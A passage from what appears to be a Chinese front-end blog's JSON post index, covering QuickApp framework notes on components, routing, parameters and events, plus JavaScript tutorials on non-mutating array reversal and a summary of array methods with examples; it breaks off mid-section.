添加数据属性，用法：this.$vm(&#39;id&#39;).$set(&#39;key&#39;,value) $delete删除数据属性，用法：this.$vm(&#39;id&#39;).$delete(&#39;key&#39;) $on 在当前页面注册监听事件， 可监听$emit()、 $dispatch()、 $broadcast()等触发的自定义事件，不能用于注册组件节点的事件响应 $off 移除事件监听，参数 fnHandler 为可选，传递仅移除指定的响应函数，不传递则移除此事件的所有监听 $emit 触发当前实例监听事件函数，与 $on() 配合使用 七、页面设计布局和尺寸 采用border-box 模型且不支持 box-sizing 属性 目前仅支持长度单位px和% 设计稿1px / 设计稿基准宽度 = 框架样式1px / 项目配置基准宽度(项目配置基准宽度:/src/manifest.json 中 config.designWidth 的值，默认750) CSS 可以使用内联样式、tag选择器、class选择器、id选择器来为组件设置样式 仅可以使用并列选择、后代选择器、子代选择器 支持@import引入外部样式、内联样式、行内样式 颜色值不支持缩写，伪类支持不完全（支持:disabled,:checked,:focus等) 八、组件 &lt;text&gt;、&lt;a&gt;、&lt;span&gt;、&lt;label&gt;组件为文本容器组件，其它组件不能直接放置文本内容 &lt;div&gt;: 和 HTML 一样 支持样式 flex-direction, flex-wrap, justify-content, align-items, align-content &lt;popup&gt;: 气泡框 支持属性 target 和 placement 支持样式 mask-color 支持事件 visibilitychange 自组件只能是&lt;text&gt; &lt;refresh&gt;: 下拉刷新 支持属性 offset和 refreshing 支持样式 background-color 和 progress-color 支持事件 refresh &lt;richtext&gt;: 富文本编辑器 支持属性 type(值为 html) 支持div样式, height 无效 不支持子组件 更多详情 https://doc.quickapp.cn/widgets/div.html 九、页面切换和参数传递9.1 参数传递传递方法1 &lt;a&gt;标签配合 queryString 传递参数, 这个和前端一致 1234&lt;a href=\"/src/home/index.html?key=2333\"&gt;跳转页面&lt;/a&gt;&lt;!-- 添加变量参数 --&gt;&lt;a href=\"/PageParams/receiveparams?key=&#123;&#123;title&#125;&#125;\"&gt;携带参数key2跳转&lt;/a&gt; 传递方法2 12// 导入模块import router from &apos;@system.router&apos; 通过 router 接口：router.push(), router.replace(), 接受一个如下结构的对象，用法这个和前端 router 一致。 1234&#123; url: '/src/home/index.html', params: &#123; key: 2333 /* 需要传递的参数 */ &#125;&#125; 接收参数 上述2种传递参数的方法，其接收方法一致，在接收参数页面的 protected对象中获取即可（可设置默认值） 1234567891011export default &#123; protected: &#123; key: '' &#125;, onInit () &#123; this.$page.setTitleBar(&#123; text: '接收参数' &#125;) // js中输出页面传递的参数 console.info('key: ' + this.key) &#125; &#125; 回传参数 开发者可能会遇到需要在页面之间回传参数的需求 假设存在页面A和页面B，先从页面A跳转至页面B，然后从页面B返回到页面A时，需要传递参数= 此时，组件a和接口router传参不能满足需求，可以借助于app级别的对象：this.$app.$data 页面A实现代码如下 123456789101112131415161718192021222324252627282930313233343536373839&lt;template&gt; &lt;div class=\"tutorial-page\"&gt; &lt;a href=\"/PageParams/returnParams/pageb\"&gt;跳转到页面B&lt;/a&gt; &lt;text&gt;&#123;&#123;msg&#125;&#125;&lt;/text&gt; &lt;/div&gt;&lt;/template&gt;&lt;style&gt; .tutorial-page &#123; flex-direction: column; justify-content: center; align-items: center; &#125; a &#123; margin-top: 75px; font-size: 30px; color: #09ba07; text-decoration: underline; &#125;&lt;/style&gt;&lt;script&gt; export default &#123; private: &#123; msg: '' &#125;, onInit () &#123; this.$page.setTitleBar(&#123; text: '页面A' &#125;) &#125;, onShow () &#123; // 页面被切换显示时，从数据中检查是否有页面B传递来的数据 if (this.$app.$data.dataPageB &amp;&amp; this.$app.$data.dataPageB.gotoPage === 'pageA') &#123; // 从数据中获取回传给本页面的数据 const data = this.$app.$data.dataPageB.params this.msg = data.msg &#125; &#125; &#125;&lt;/script&gt; 页面B实现代码如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;template&gt; &lt;div class=\"tutorial-page\"&gt; &lt;text&gt;页面B&lt;/text&gt; &lt;input style=\"width: 450px;\" placeholder=\"请输入回传给页面A的信息\" onchange=\"updateMsg\"/&gt; &lt;/div&gt;&lt;/template&gt;&lt;style&gt; .tutorial-page &#123; flex-direction: column; justify-content: center; align-items: center; &#125;&lt;/style&gt;&lt;script&gt; export default &#123; private: &#123; msg: '' &#125;, onInit () &#123; this.$page.setTitleBar(&#123; text: '页面B' &#125;) &#125;, onHide () &#123; // 页面被切换隐藏时，将要传递的数据对象写入 this.$app.$data.dataPageB = &#123; gotoPage: 'pageA', params: &#123; msg: this.msg &#125; &#125; &#125;, updateMsg (e) &#123; // 更新input输入的信息文本 this.msg = e.text &#125; &#125;&lt;/script&gt; 9.2 页面间通信 https://doc.quickapp.cn/framework/script.html 会利用到一个构造函数 new BroadcastChannel(string), 它接受一个字符串参数，作为实例的频道名称。它的实例具有以下属性和方法 name 频道名称,区分不同的消息频道(注意：不同频道之间不可通信)。 postMessage 用于在当前频道中广播消息 onmessage 订阅消息。在频道中接收到广播消息之后，会给所有订阅者派发消息事件 close 关闭当前的频道 其中 onmessage 事件有2个属性(通过 event 对象访问) type message data 接收到的消息内容 十、组件通信父组件到子组件 子组件通过 props 获取父组件传入的值，见上文 template 部分 通过 this.watch(props, callback) 监控传入数据变化并调用回调函数 父组件通过this.$broadcast()完成事件触发，子组件通过$on()绑定事件并响应 子组件到父组件 父子组件传对象类型属于引用传递，可以直接修改父组件传入对象改变父组件数据 子组件通过this.$dispatch()完成事件触发，父组件通过$on()绑定事件并响应 子组件通过this.$emit()触发在节点上绑定的事件来执行父组件的方法 注：this.$broadcast()、this.$emit() 和 this.$dispatch()参数一致 注：触发时传递参数，再接收时使用event.detail来获取参数 注：当传递结束后，可以调用event.stop()来结束传递 十一、Deeplink 配合&lt;web&gt;标签框架支持通过链接从外部打开应用，格式 123http://hapjs.org/app/&lt;package&gt;/[path][?key=value]https://hapjs.org/app/&lt;package&gt;/[path][?key=value]hap://app/&lt;package&gt;/[path][?key=value] package: 应用包名，必选 path: 应用内页面的path，可选，默认为首页 key-value: 希望传给页面的参数，可选，可以有多个 从传统网页调起需引入以下脚本 1&lt;script src=&apos;//statres.quickapp.cn/quickapp/js/routerinline.min.js&apos;/&gt; 十二、事件监听与触发 $on 用于监听自定义事件；$off移除对应的事件监听 $on(evtName, fnHandler) 在当前页面注册监听事件， 可监听$emit()、 $dispatch()、 $broadcast()等触发的自定义事件，不能用于注册组件节点的事件响应 123456789export default &#123; onInit()&#123; this.$on('customEvtType1', this.customEvtType1Handler) &#125;, customEvtType1Handler(evt)&#123; // 事件类型，事件参数 console.info(`触发事件：类型：$&#123;evt.type&#125;, 参数： $&#123;JSON.stringify(evt.detail)&#125;`); &#125; &#125; $off(evtName, fnHandler) 移除事件监听，参数 fnHandler 为可选，传递仅移除指定的响应函数，不传递则移除此事件的所有监听 12345678export default &#123; removeEventHandler () &#123; // 不传递fnHandler：移除所有监听 this.$off('customEvtType1') // 传递fnHandler：移除指定的监听函数 this.$off('customEvtType1', this.customEvtType1Handler) &#125; &#125; 触发ViewModel事件 页面的交互中可能会遇到一些非手动触发的需求，$emit() 通过触发当前实例上的事件达到动态触发事件的行为 $emit(evtName, evtDetail) 触发当前实例监听事件函数，与 $on() 配合使用 注意：$emit() 目前只触发 $on 所监听的事件 12345export default &#123; emitEvent () &#123; this.$emit('customEvtType1', &#123; params: '参数内容' &#125;) &#125; &#125; 监听原生组件事件 原生组件支持一系列事件，如通用事件（如：click, disappear）、组件专有事件（如：focus） 在响应函数执行时通过target获取，如：onClickHandler 在响应函数绑定时传递参数，如：onClickHandler2 123456789101112131415161718192021222324252627282930313233&lt;template&gt; &lt;div class=\"tutorial-page\"&gt; &lt;text id=\"elNode1\" class=\"&#123;&#123; elClassName + 1 &#125;&#125;\" disabled=\"false\" onclick=\"onClickHandler\"&gt;组件节点1&lt;/text&gt; &lt;text id=\"elNode2\" class=\"class-static-1 &#123;&#123; elClassName + 2 &#125;&#125;\" onclick=\"onClickHandler2('参数1', argName)\"&gt;组件节点2&lt;/text&gt; &lt;/div&gt;&lt;/template&gt;&lt;style lang=\"less\"&gt; .tutorial-page &#123; flex-direction: column; &#125;&lt;/style&gt;&lt;script&gt; export default &#123; private: &#123; elClassName: 'class-dynamic', argName: '动态参数' &#125;, onClickHandler (evt) &#123; // 事件类型，参数详情 console.info(`触发事件：类型：$&#123;evt.type&#125;, 详情： $&#123;JSON.stringify(evt.detail)&#125;`); if (evt.target) &#123; console.info(`触发事件：节点：$&#123;evt.target.id&#125;, $&#123;evt.target.attr.disabled&#125;`) &#125; &#125;, onClickHandler2 (arg1, arg2, evt) &#123; // 事件类型，事件参数，target console.info(`触发事件：类型：$&#123;evt.type&#125;, 参数： $&#123;arg1&#125;, $&#123;arg2&#125;`); &#125; &#125;&lt;/script&gt; 触发原生组件事件 通过$emitElement()完成事件的动态触发 $emitElement(evtName, evtDetail, id) 可以触发指定组件id的事件，通过evt.detail获取传递的参数；该方法对自定义组件无效 1234567891011121314151617181920212223242526272829303132333435363738&lt;template&gt; &lt;div class=\"tutorial-page\"&gt; &lt;text onclick=\"emitElement\"&gt;触发组件节点的事件：click&lt;/text&gt; &lt;text id=\"elNode1\" class=\"&#123;&#123; elClassName + 1 &#125;&#125;\" disabled=\"false\" onclick=\"onClickHandler\"&gt;组件节点1&lt;/text&gt; &lt;text id=\"elNode2\" class=\"class-static-1 &#123;&#123; elClassName + 2 &#125;&#125;\" onclick=\"onClickHandler2('参数1', argName)\"&gt;组件节点2&lt;/text&gt; &lt;/div&gt;&lt;/template&gt;&lt;style lang=\"less\"&gt; .tutorial-page &#123; flex-direction: column; &#125;&lt;/style&gt;&lt;script&gt; export default &#123; private: &#123; elClassName: 'class-dynamic', argName: '动态参数' &#125;, onClickHandler (evt) &#123; // 事件类型，参数详情 console.info(`触发事件：类型：$&#123;evt.type&#125;, 详情： $&#123;JSON.stringify(evt.detail)&#125;`); if (evt.target) &#123; console.info(`触发事件：节点：$&#123;evt.target.id&#125;, $&#123;evt.target.attr.disabled&#125;`) &#125; &#125;, onClickHandler2 (arg1, arg2, evt) &#123; // 事件类型，事件参数，target console.info(`触发事件：类型：$&#123;evt.type&#125;, 参数： $&#123;arg1&#125;, $&#123;arg2&#125;`); &#125;, emitElement () &#123; // 注意：通过此类方式的事件不会携带target属性，开发者可以通过detail参数实现 this.$emitElement('click', &#123; params: '参数内容' &#125;, 'elNode1') &#125; &#125;&lt;/script&gt; 十三、一些问题 自定义属性名不能采用驼峰命名，否则值永远是 undefined show 属性并不好用，没起什么作用 类似 onInit 等等函数是页面生命周期，不是组件生命周期，不会因为组件状态变化而执行 display类型只有 flex 和 none 子盒子不能将父盒子撑高 不遵循盒子模型，类似但不完全等同于 border-box 十四、快应用开发资源 快应用API Demo 集合 QuickAPP awesome-quick-app","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"快应用","slug":"快应用","permalink":"https://ru23.com/tags/快应用/"}]},{"title":"怎么把数组倒置，又不影响原来数组，reverse不行","slug":"2018-08-怎么把数组倒置，又不影响原来数组，reverse不行","date":"2018-08-18T15:33:00.000Z","updated":"2018-10-24T03:46:02.603Z","comments":true,"path":"note/46862a63.html","link":"","permalink":"https://ru23.com/note/46862a63.html","excerpt":"","text":"情景：怎么把数组倒置，又不影响原来数组，reverse不行，会把原数组也给反过来。1234var arr = [\"1\",\"2\",\"3\",\"4\"];var bbb = arr.reverse()console.log(arr); //[\"4\", \"3\", \"2\", \"1\"]console.log(bbb); //[\"4\", \"3\", \"2\", \"1\"] 直接改的话bbb和arr指向是同一个数组对象。reverse改变的是数组对象，a指向它，所以改变了，要改变就要让其指向不同 解决方案12345678var arr = [\"1\",\"2\",\"3\",\"4\"];//列举4个解决方案var bbb = [...arr].reverse() //方法1var bbb = [].concat(arr).reverse() //方法2var bbb = Object.assign([],arr).reverse()//方法3var bbb = arr.slice().reverse()//方法4console.log(arr); console.log(bbb); ES6语法很方便~","categories":[],"tags":[{"name":"js代码片段","slug":"js代码片段","permalink":"https://ru23.com/tags/js代码片段/"}]},{"title":"JavaScript数组方法总结篇","slug":"2018-08-javaScript-arr-summary","date":"2018-08-18T10:40:43.000Z","updated":"2018-10-24T09:45:54.246Z","comments":true,"path":"note/cd524e3e.html","link":"","permalink":"https://ru23.com/note/cd524e3e.html","excerpt":"","text":"一、数组预览图 数组方法 二、会改变原数组的方法2.1 push() 方法在数组的尾部添加一个或多个元素，并返回数组的长度 参数: item1, item2, …, itemX ,要添加到数组末尾的元素 1234567let arr = [1,2,3];let length = arr.push('末尾1','末尾2'); // 返回数组长度console.log(arr,length)// [1, 2, 3, \"末尾1\", \"末尾2\"] 5 返回值： 数组的长度 2.2 pop() 方法删除数组的最后一个元素，减小数组长度并返回它删除的值 1234567//组合使用push()和pop()能够用JavaScript数组实现先进后出的栈let stack = [];stack.push(1,2) // 返回长度2，这时stack的值是[1,2]stack.pop() // 返回删除的值2，这时stack的值是[1] 返回值： 从数组中删除的元素(当数组为空时返回undefined)。 2.3 unshift() 方法在数组的头部添加一个或多个元素，并将已存在的元素移动到更高索引的位置来获得足够的空间，最后返回数组新的长度 1234567let arr = [3,4,5];let length = arr.unshift(1,2); // 返回长度是5console.log(arr, length)//[1, 2, 3, 4, 5] 5 返回值： 返回数组新的长度 2.4 shift() 方法删除数组的第一个元素并将其返回，然后把所有随后的元素下移一个位置来填补数组头部的空缺，返回值是删除的元素 1234567let arr = [1,2,3];let item = arr.shift(); // 返回删除的值1console.log(arr, item)// [2, 3] 1 返回值： 从数组中删除的元素; 如果数组为空则返回undefined 2.5 splice() 方法是在数组中插入或删除元素的通用方法 123456789101112131415161718192021222324252627282930313233// start不超过数组长度(以下操作是连续的)let arr = [1,2,3,4,5];arr.splice(2) // arr是[1,2]，返回值是[3,4,5]arr.splice(1,1) // arr是[1]，返回值是[2]arr.splice(0,3) // arr是[]，返回值是[1],因为此时数组从第0位开始不够3位，所以是删除从0开始到最后的所有元素。// start大于数组长度(以下操作是连续的)let arr = [1,2,3,4,5];arr.splice(5) // arr是[1,2,3,4,5]，返回值是[]arr.splice(5,3,6) // arr是[1,2,3,4,5,6]，返回值是[]arr.splice(5,3,7) // arr是[1,2,3,4,5,7] 返回值是[6]// start是负数(以下操作是连续的)let arr = [1,2,3,4,5];arr.splice(-3,2); // arr是[1,2,5], 返回值是[3,4]arr.splice(-4); // arr是[],返回值是[1,2,5]// 插入数组时，是插入数组本身，而不是数组元素let arr = [1,4,5];arr.splice(1,0,[2,3]) // arr是[1,[2,3],4,5]，返回值是[] 2.6 sort() sort() 方法将数组中的元素排序并返回排序后的数组 123456789101112131415161718192021222324252627var stringArray = [\"Blue\", \"Humpback\", \"Beluga\"];var numberArray = [40, 1, 5, 200];function compareNumbers(a, b)&#123; return a - b;&#125;console.log('stringArray:' + stringArray.join());console.log('Sorted:' + stringArray.sort());console.log('numberArray:' + numberArray.join());// 没有使用比较函数时，数字并不会按照我们设想的那样排序console.log('Sorted without a compare function:'+ numberArray.sort());console.log('Sorted with compareNumbers:'+ numberArray.sort(compareNumbers));//打印如下// stringArray: Blue,Humpback,Beluga// Sorted: Beluga,Blue,Humpback// numberArray: 40,1,5,200// Sorted without a compare function: 1,200,40,5// Sorted with compareNumbers: 1,5,40,200 返回值： 返回排序后的数组。原数组已经被排序后的数组代替 2.7 reverse() 方法将数组中的元素颠倒顺序，返回逆序的数组 123let arr = [1,2,3];arr.reverse() // arr是[3,2,1]，返回值是[3,2,1] 返回值： 返回顺序颠倒后的数组。原数组已经被排序后的数组代替 2.8 fill() 方法用一个固定值填充一个数组中从起始索引到终止索引内的全部元素 1arr.fill(value[, start[, end]]) value 用来填充数组元素的值。 start (可选) 起始索引，默认值为0。 end (可选) 终止索引，默认值为 this.length。 如果 start 是个负数, 则开始索引会被自动计算成为 length+start, 其中 length 是 this 对象的 length属性值. 如果 end 是个负数, 则结束索引会被自动计算成为 length+end 返回值： 修改后的数组 123456789101112131415161718192021[1, 2, 3].fill(4); // [4, 4, 4][1, 2, 3].fill(4, 1); // [1, 4, 4][1, 2, 3].fill(4, 1, 2); // [1, 4, 3][1, 2, 3].fill(4, 1, 1); // [1, 2, 3][1, 2, 3].fill(4, 3, 3); // [1, 2, 3][1, 2, 3].fill(4, -3, -2); // [4, 2, 3][1, 2, 3].fill(4, NaN, NaN); // [1, 2, 3][1, 2, 3].fill(4, 3, 5); // [1, 2, 3]Array(3).fill(4); // [4, 4, 4]//fill 方法故意被设计成通用方法, 该方法不要求 this 是数组对象。[].fill.call(&#123; length: 3 &#125;, 4); // &#123;0: 4, 1: 4, 2: 4, length: 3&#125; 三、不改变原数组的方法3.1 slice() 方法返回一个从开始到结束（不包括结束）选择的数组的一部分浅拷贝到一个新数组对象。且原始数组不会被修改 返回值： 一个含有提取元素的新数组 1234567891011121314151617181920212223242526272829303132let arr = [1,2,3,4,5];let arr1 = arr.slice(1,3); // arr是[1,2,3,4,5]， arr1是[2,3]let arr2 = arr.slice(-2,-1); // arr是[1,2,3,4,5], arr2是[4]// 开始位置在结束位置后面，得到的数组是空let arr3 = arr.slice(-2, -3); // arr是[1,2,3,4,5], arr3是[]let arr4 = arr.slice(2, 1); // arr是[1,2,3,4,5], arr4是[]//如果元素是个对象引用 （不是实际的对象），slice 会拷贝这个对象引用到新的数组里。两个对象引用都引用了同一个对象。如果被引用的对象发生改变，则新的和原来的数组中的这个元素也会发生改变。let arr = [&#123;name: 'xiaoming'&#125;];let arr1 = arr.slice(); // arr是[&#123;name: xiaoming&#125;]，arr1是[&#123;name: 'xiaoming'&#125;]arr1[0].name = 'xiaogang'; // arr是[&#123;name: 'xiaogang'&#125;]，arr1是[&#123;name: 'xiaogang'&#125;]// 对于字符串、数字及布尔值来说（不是 String、Number 或者 Boolean 对象），slice 会拷贝这些值到新的数组里。在别的数组里修改这些字符串或数字或是布尔值，将不会影响另一个数组。let arr = [1,2,3];let arr1 = arr.slice(); // arr是[1,2,3]，arr1是[1,2,3]arr1[1] = \"two\"; // arr是[1,2,3]，arr1是[1,\"tow\",3]// 当然，如果向两个数组任一中添加了新元素（简单或者引用类型），则另一个不会受到影响 3.2 join() 方法将数组（或一个类数组对象）中所有元素都转化为字符串并连接在一起，返回最后生成的字符串 返回值： 一个所有数组元素连接的字符串。如果 arr.length 为0，则返回空字符串 1234567891011121314151617181920212223let num = [1,2,3];let str1 = num.join(); // 1,2,3let str2 = num.join(', ') // 1, 2, 3let str3 = num.join('') // 123//所有的数组元素被转换成字符串，再用一个分隔符将这些字符串连接起来。如果元素是undefined 或者null， 则会转化成空字符串。let num = [1,null,3];let str1 = num.join(); // 1,,3//如果数组中的元素是数组，会将里面的数组也调用join()let num = [[1,2],3];let str1 = num.join('-'); // 1,2-3// 如果数组中的元素是对象，对象会被转为[object Object]字符串let num = [&#123;num: 1&#125;,2,3];let str1 = num.join('-'); // [object Object]-2-3 123// 扁平化简单的二维数组const arr = [11, [22, 33], [44, 55], 66];const flatArr = arr.join().split(','); // [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"] 3.3 toString() 方法将数组的每个元素转化为字符串(如有必要将调用元素的toString()方法)并且输出用逗号分割的字符串列表。返回一个字符串表示数组中的元素 123456789[1,2,3].toString(); // 1,2,3[1,[2,'c']].toString(); //1,2,c// 以上与不使用任何参数调用join()方法返回的字符串是一样的。// 以下的这个例子要跟下面的toLocaleString对照看[&#123;a:1&#125;,1,new Date()].toString() //\"[object Object],1,Sat Jul 07 2018 18:43:45 GMT+0800 (中国标准时间)\" 注意： 当数组和字符串操作的时候，js 会调用这个方法将数组自动转换成字符串 1[1,2,3]+&apos;abc&apos; //1,2,3abc 返回值： 返回一个字符串表示数组中的元素 1234// 扁平化简单的二维数组const arr = [11, [22, 33], [44, 55], 66];const flatArr = arr.toString().split(','); // [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"] 3.4 toLocaleString() 数组中的元素将使用各自的 toLocaleString 方法转成字符串，这些字符串将使用一个特定语言环境的字符串（例如一个逗号 “,”）隔开 1234567891011121314151617181920212223//数组中的元素将会使用各自的 toLocaleString 方法：// Object: Object.prototype.toLocaleString()// Number: Number.prototype.toLocaleString()// Date: Date.prototype.toLocaleString()let prices = ['￥7', 500, 8123, 12];// 不带参数prices.toLocaleString(); // \"￥7,500,8,123,12\"//带参数prices.toLocaleString('ja-JP', &#123; style: 'currency', currency: 'JPY' &#125;); // \"￥7,500,8,123,12\"//MDN上的举例中说是 \"￥7,￥500,￥8,123,￥12\"，在浏览器和Node中验证了返回的都是 \"￥7,500,8,123,12\" 啊！// 以下的这个例子要跟上面的toString对照看[&#123;a:1&#125;,1,new Date()].toLocaleString() //\"[object Object],1,2018/7/7 下午6:45:00\" 返回值： 表示数组元素的字符串 3.5 concat() 它的元素包括调用concat()的原始数组的元素和concat()的每个参数，但是要注意，concat()不会递归扁平化数组的数组，concat()也不会修改调用的数组 12345678910111213141516171819202122232425262728293031323334353637[1,2,3].concat([4,5,6],[7,8,9]) // [1, 2, 3, 4, 5, 6, 7, 8, 9]['a','b','c'].concat(1,[2,3],[[4,5]]) // [\"a\", \"b\", \"c\", 1, 2, 3, [4,5]]// concat方法不会改变this或任何作为参数提供的数组，而是返回一个浅拷贝,所以原始数组和新数组都引用相同的对象。 如果引用的对象被修改，新数组和原始数组都会变。let obj = &#123;a: 1&#125;;let arr1 = [2,obj];let arr2 = [1].concat(arr1);console.log(arr1,arr2) //[2,&#123;a:1&#125;],[1,2,&#123;a:1&#125;]//记录下上面的打印结果之后修改objobj.a = 2;console.log(arr1,arr2) ////[2,&#123;a:2&#125;],[1,2,&#123;a:2&#125;]// 说了是浅拷贝，而且原数组也不改变，那我们就可以用它来实现数组的浅拷贝功能let num1 = [1,2,3];//第一种let num2 = num1.concat();//第二种let num2 = [].concat(num1);num2[0] = 'a';console.log(num1,num2); // [1, 2, 3] [\"a\", 2, 3] 3.6 isArray() 用于确定传递的值是否是一个 Array 1234567891011121314151617181920212223242526272829303132// 下面的函数调用都返回 trueArray.isArray([]);Array.isArray([1]);Array.isArray(new Array());// 这里注意：Array.prototype 也是一个数组,一个属性值不是索引的数组。[constructor: ƒ, concat: ƒ, find: ƒ, findIndex: ƒ, pop: ƒ, …]Array.isArray(Array.prototype);// 下面的函数调用都返回 falseArray.isArray();Array.isArray(&#123;&#125;);Array.isArray(null);Array.isArray(undefined);Array.isArray(17);Array.isArray('Array');Array.isArray(true);Array.isArray(false);Array.isArray(&#123; __proto__: Array.prototype &#125;); 四、数组遍历、映射、过滤、检测、简化等方法4.1 forEach() 方法从头到尾遍历数组，为每个元素调用指定的函数 callback 为数组中每个元素执行的函数，该函数接收三个参数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119// 1、 空元素不遍历,undefined和null是会遍历的。let numberArr = [1,2,,3];numberArr.forEach(function (value,index,array) &#123; console.log(value,index,array)&#125;)//打印信息如下，可见空元素是不会遍历的//1 0 [1, 2, empty, 3]//2 1 [1, 2, empty, 3]//3 3 [1, 2, empty, 3]let nullArr = [1,2,null,3];nullArr.forEach(function (value,index,array) &#123; console.log(value,index,array)&#125;)//打印信息如下，null是会遍历的//1 0 (4) [1, 2, null, 3]//2 1 (4) [1, 2, null, 3]//null 2 (4) [1, 2, null, 3]//3 3 (4) [1, 2, null, 3]//2、已删除的项不会被遍历到。如果已访问的元素在迭代时被删除了,之后的元素将被跳过let numberArr = [1,2,3];numberArr.forEach(function (value,index,array) &#123; if(index === 0) &#123; delete numberArr[2]; //删除第三项 //或者numberArr.pop()&#125;console.log(value,index,array)&#125;)//打印信息如下：// 1 0 (3) [1, 2, empty]// 2 1 (3) [1, 2, empty]let numberArr1 = [1,2,3,4];numberArr1.forEach(function (value,index,array) &#123;if(index === 1) &#123; numberArr1.shift() //遍历到第二项的时候，删除第一项&#125;console.log(value,index,array)&#125;)// 打印信息如下,遍历到第二项的时候，删除第一项，会跳过第三项// 1 0 (4) [1, 2, 3, 4]// 2 1 (3) [2, 3, 4]// 4 2 (3) [2, 3, 4]// 3、forEach 遍历的范围在第一次调用 callback 前就会确定。调用forEach 后添加到数组中的项不会被 callback 访问到。如果已经存在的值被改变，则传递给 callback 的值是 forEach 遍历到他们那一刻的值。let arr = [1,2,3];arr.forEach(function (value,index,array) &#123; if(index === 0) &#123; arr.push('新增的不会被遍历到') arr[2] = 4;&#125;console.log(value,index,array)&#125;)// 1 0 (4) [1, 2, 4, \"新增的不会被遍历到\"]// 2 1 (4) [1, 2, 4, \"新增的不会被遍历到\"]// 4 2 (4) [1, 2, 4, \"新增的不会被遍历到\"]// 4、使用thisArg参数 和 箭头函数使用thisArglet arr = [1,2,3];let obj = &#123;arr: 'thisArg'&#125;arr.forEach(function () &#123; console.log(this.arr)&#125;,obj)// 打印三次 'thisArg'let arr = [1,2,3];let obj = &#123;arr: 'thisArg'&#125;arr.forEach(() =&gt; &#123; console.log(this.arr)&#125;,obj)// 打印三次 undefined// 5、forEach无法中途退出循环，只能用return退出本次回调，进行下一次回调let arr = [1,2,3];let result = arr.forEach((value) =&gt; &#123; if(value == 2) &#123; return value; &#125; console.log(value)&#125;)console.log(result) // undefined ，即使中间return vlaue，也还是undefined//打印value的值如下，说明return 并不能终止循环// 1// 3 4.2 map() 方法创建一个新数组，其结果是该数组中的每个元素都调用一个callback函数后返回的结果 返回值： 一个新数组，每个元素都是回调函数的结果 不要用 map 代替 forEach,map 会创建一个新的数组，占用内存。如果你不用 map 的返回值，那你就应当使用 forEach 4.3 filter() 方法返回的数组元素是调用的数组的一个子集。传入的函数时用来逻辑判定的，该函数返回 true 或 false,如果返回值为true或能转化为true的值，那么传递给判断函数的元素就是这个子集的成员，它将被添加倒一个作为返回值的数组中 返回值： 一个新的通过测试的元素的集合的数组，如果没有通过测试则返回空数组 4.4 every() 方法测试数组的所有元素是否都通过了指定函数的测试。当且仅当针对数组中的所有元素调用判定函数都返回true，它才返回true。 空数组上调用every方法，返回 true，因为空数组没有元素，所以空数组中所有元素都符合给定的条件 返回值： 一个布尔值，当所有的元素都符合条件才返回true，否则返回false 12345678910111213141516171819202122232425262728293031let arr = [12,34,5,23,44];let num = 0;let result = arr.every(function (element, index, array) &#123; num++; return element &gt; 10;&#125;)console.log(result,num) // 打印 false 3// 可见发现5这个小于10的元素后，遍历立即终止，num为3let arr = [12,34,,23,44];let num = 0;let result = arr.every(function (element, index, array) &#123;num++;return element &gt; 10;&#125;)console.log(result,num) // 打印 true 4// 不会遍历没有赋值的索引位置，所以num为4let result = [].every(function (element, index, array) &#123;return element &gt; 10;&#125;)console.log(result) // 打印 true 4.5 some() 方法测试数组中的某些元素是否通过由提供的函数实现的测试。当数组中至少有一个元素调用判定函数返回true，它就返回true，当且仅当数组中的所有元素调用判定函数都返回false，它才返回false 空数组调用some，返回false 返回值： 只要数组中的任意一个元素在回调函数中返回的是真值，就返回true，否则为false 12345678910111213141516171819202122232425262728293031323334// 一个简单的例子说明function isBiggerThan10(element, index, array) &#123; console.log(index) return element &gt; 10;&#125;[2, 5, 8, 1, 4].some(isBiggerThan10); // 返回值是false，打印的index是0,1,2,3,4[12, 5, 8, 1, 4].some(isBiggerThan10); // 返回值是true，打印的index是0，找到符合元素之后立即返回// 实现一个跟includes方法类似的功能let arr = [1,2,3];function include(value) &#123;return arr.some((element) =&gt; &#123; return element === value&#125;)&#125;include(2) // trueinclude(4) // falselet result = [].some(function (element, index, array) &#123;return element &gt; 10;&#125;)console.log(result) // 打印 false 4.6 reduce() 和 reduceRight() 这两个方法使用指定的函数将数组元素进行组合，生成单个值。这在函数式编程中是常见的操作，也可以称为“注入”和“折叠”。reduceRight() 和 reduce() 工作原理是一样的，不同的是reduceRight() 按照数组索引从高到低（从右到左）处理数组，而不是从低到高 如果数组为空且没有提供initialValue，会抛出TypeError 。如果数组仅有一个元素（无论位置如何）并且没有提供initialValue， 或者有提供initialValue但是数组为空，那么此唯一值将被返回并且callback不会被执行 返回值： 函数累计处理的结果 1234567891011121314151617181920212223242526272829303132333435363738let arr = [1,2,3,4,5];let sum = arr.reduce((x,y) =&gt; x + y,0);console.log(sum) // 15// 看一下initialValue传和不传的区别let arr = [1,2,3,4,5];arr.reduce(function (accumulator,currentValue,currentIndex,arr) &#123; console.log(currentIndex) return accumulator + currentValue;&#125;)// 1,2,3,4,5 没传入initialValue，索引是从1开始arr.reduce(function (accumulator,currentValue,currentIndex,arr) &#123; console.log(currentIndex) return accumulator + currentValue;&#125;,10)// 0,1,2,3,4,5 传入initialValue，索引从0开始// 应用到二维数组展开let arr = [[0, 1], [2, 3], [4, 5]].reduce( (a, b) =&gt; a.concat(b));console.log(arr)// [0, 1, 2, 3, 4, 5] 4.7 indexof() 方法返回在数组中可以找到一个给定元素的第一个索引，如果不存在，则返回-1 注意： indexOf 使用严格相等（即 ===）比较 searchElement 和数组中的元素。而且indexOf()不能识别 NaN 返回值： 首个被找到的元素在数组中的索引位置; 若没有找到则返回 -1 1234567891011121314151617let array = [2, 5, 9];array.indexOf(2) // 0array.indexOf(7) // -1array.indexOf(9, 2) // 2array.indexOf(9, 3) // -1array.indexOf(2, -1) // -1array.indexOf(2, -3) // 0array.indexOf(2, -4) // 0let array1 = [1,2,NaN];array1.indexOf(NaN) // -1 4.8 includes() 方法用来判断一个数组是否包含一个指定的值，根据情况，如果包含则返回 true，否则返回false。 ES7新增 返回值： 一个布尔值，根据情况，如果包含则返回 true，否则返回false 123456[1, 2, 3].includes(2); // true[1, 2, 3].includes(4); // false[1, 2, 3].includes(3, 3); // false[1, 2, 3].includes(3, -1); // true[1, 2, 3].includes(3, -4); // true[1, 2, NaN].includes(NaN); // true 4.9 find() 和 findIndex() find 